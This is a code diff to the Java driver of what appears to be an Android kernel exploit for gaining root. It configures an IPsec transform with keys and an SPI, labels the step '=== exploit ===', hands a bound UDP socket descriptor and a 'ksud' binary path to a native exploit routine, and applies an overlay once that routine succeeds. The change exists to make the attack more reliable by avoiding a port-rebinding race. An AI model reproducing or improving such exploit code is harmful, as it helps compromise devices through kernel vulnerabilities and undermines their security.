@@ -102,7 +102,7 @@ final class Runner {
 
             DatagramSocket senderSock = new DatagramSocket();
             int senderPort = senderSock.getLocalPort();
-            senderSock.close();
+            android.os.ParcelFileDescriptor senderFd = null;
 
             transform = new IpSecTransform.Builder(ctx)
                     .setEncryption(enc)
@@ -121,8 +121,14 @@ final class Runner {
                     + " (" + ksud.length() + " bytes)\n");
             reporter.report("\n=== exploit ===\n");
 
-            int rc = MainActivity.nativeRunAll(reporter, encapPort, spiVal,
-                    aesKey, hmacKey, ICV_LEN, senderPort, ksud.getAbsolutePath(), softReboot);
+            // Hand the already-bound socket fd to the native side instead of
+            // closing it and racing to re-bind the same port there.
+            senderFd = android.os.ParcelFileDescriptor.fromDatagramSocket(senderSock);
+            int rc = Native.nativeRunAll(reporter, encapPort, spiVal,
+                    aesKey, hmacKey, ICV_LEN, senderFd.getFd(),
+                    ksud.getAbsolutePath(), softReboot);
+            closeQuietly(senderFd);
+            closeQuietly(senderSock);
 
             if (rc == 0) {
                 applyOverlay(ctx, reporter, 120000L);
